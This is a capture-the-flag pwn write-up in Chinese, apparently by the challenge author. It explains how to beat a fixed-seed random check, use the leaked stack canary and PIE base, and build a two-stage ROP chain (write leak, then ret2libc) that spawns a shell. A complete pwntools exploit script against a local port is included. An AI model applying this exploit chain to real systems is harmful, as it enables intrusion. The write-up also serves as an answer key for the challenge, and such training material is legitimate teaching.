# 辣卤客，我为你带来烩面啦！

> 题目类型：pwn
>
> 难度：中（偏高）
>
> 考点：栈溢出、整数溢出、伪随机Srand、Canary绕过、PIE绕过、ret2text、ret2libc、ROP、栈对齐

## 原型题

[HDCTF 2023]pwnner，伪随机思路出处

https://www.nssctf.cn/problem/3773

## 命题思路

这题为了保证能有一定的通过率，涉及的考点都比较常见。Canary和base_addr都以gift的形式给出，可以直接利用构造ROP；

## 解题思路

整数溢出 + 伪随机校验通过后才可进入`gift()`函数，这里伪随机直接使用固定种子33550336，选手可以使用同一种子生成相同随机数，进而通过校验，也可以动态调试查看寄存器值拿到这个随机数

```python
from ctypes import cdll
libc_dll = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")

seed = 33550336
libc_dll.srand(seed)
rand = libc_dll.rand()

p.sendline("-1")
p.sendline(f"{rand}")
```

`gift`函数使用`write()`函数泄露`Canary`和程序基地址，可供选手实现Canary绕过和PIE绕过

````python
p.recvuntil(b"gift for you!\n")
p.recv(1)
canary = int(p.recvline().strip(), 16)
base_addr = int(p.recvline().strip(), 16)
````

`vuln()`函数存在长溢出，需要重复调用两次。首次调用时`ret2text`，跳转至gadget，利用ROP设计参数并借助plt表 跳转至`write()`函数，泄露自身`symbol`实际地址，以`write()`函数实际地址计算`libc_base`

```python
write_got = elf.got["write"] + base_addr
write_libc = libc.sym["write"]
vuln_read = 0x134d + base_addr
write_plt = elf.plt["write"] + base_addr

padding = 0x68 
pop_rdi = 0x13fe + base_addr 
pop_rsi = 0x13c5 + base_addr
pop_rdx = 0x13c7 + base_addr
ret = 0x101a + base_addr

payload1 = padding * b"a" + (p64(canary) + p64(0))
payload1 += p64(pop_rsi) + p64(write_got) 
payload1 += p64(pop_rdx) + p64(8)
payload1 += p64(pop_rdi) + p64(1)
payload1 += p64(write_plt)
payload1 += p64(vuln_read)

p.recvuntil("smashing happily!\n")
p.sendline(payload1)
```

再`ret2text`回到`vuln()`函数，触发`read()`函数，再读`payload2`，借助计算出的libc地址打`ret2libc`调用`system(“/bin/sh”)`

```python
write_sym = u64(p.recv(8))
libc_base = write_sym - write_libc # recv write -> libc_base
sys = libc.sym["system"] + libc_base
bin_sh = next(libc.search(b"/bin/sh")) + libc_base

payload2 = padding * b'a' + (p64(canary) + p64(0))
payload2 += p64(ret) 
payload2 += p64(pop_rdi) + p64(bin_sh) + p64(sys)

p.recvuntil("smashing happily!\n")
p.sendline(payload2)
p.interactive()
```

### exp

```python
from pwn import *
from ctypes import cdll

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

lc = "./pwn"
libc_dll = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")

elf = ELF(lc)
libc = ELF("./libc.so.6")

#p = process(lc)
#p = gdb.debug(lc, "break vuln")
p = remote("127.0.0.1", 9999)

# 此处使用seed可以破解伪随机（也可以手动输出寄存器值得到实际随机值）
seed = 33550336
libc_dll.srand(seed)
rand = libc_dll.rand()
print(f"random v0: {rand}")


p.sendline("-1")
p.sendline(f"{rand}")

p.recvuntil(b"gift for you!\n")
p.recv(1)
canary = int(p.recvline().strip(), 16)
base_addr = int(p.recvline().strip(), 16)

print(f"Canary leaked: {hex(canary)}")
print(f"Base address leaked: {hex(base_addr)}")

write_got = elf.got["write"] + base_addr
write_libc = libc.sym["write"]

print(f"write.got find: {hex(write_got)}")

padding = 0x68 

pop_rdi = 0x13fe + base_addr 
pop_rsi = 0x13c5 + base_addr
pop_rdx = 0x13c7 + base_addr
ret = 0x101a + base_addr

vuln_read = 0x134d + base_addr
write_plt = elf.plt["write"] + base_addr
#read_plt = elf.plt["read"] + base_addr

payload1 = padding * b"a" + (p64(canary) + p64(0)) 
#payload1 = payload1 + p64(ret)

payload1 += p64(pop_rsi) + p64(write_got) 
payload1 += p64(pop_rdx) + p64(8)
payload1 += p64(pop_rdi) + p64(1)
payload1 += p64(write_plt)
payload1 += p64(vuln_read)

p.recvuntil("smashing happily!\n")
p.sendline(payload1)

write_sym = u64(p.recv(8))
libc_base = write_sym - write_libc# recv write -> libc_base

sys = libc.sym["system"] + libc_base
bin_sh = next(libc.search(b"/bin/sh")) + libc_base

pop_rdi = libc_base + 0x2a3e5 # ROPgadget自查libc文件

print(f"write symbol leaked: {hex(write_sym)}")
print(f"libc base address calculated: {hex(libc_base)}")
print(f"system function found: {hex(sys)}")
print(f"pop rdi gadget found: {hex(pop_rdi)}")
print(f"\'/bin/sh\' string found: {hex(bin_sh)}")

p.recvuntil("smashing happily!\n")

payload2 = padding * b'a' + (p64(canary) + p64(0))
payload2 += p64(ret) 
payload2 += p64(pop_rdi) + p64(bin_sh) + p64(sys)

p.sendline(payload2)

p.interactive()

```

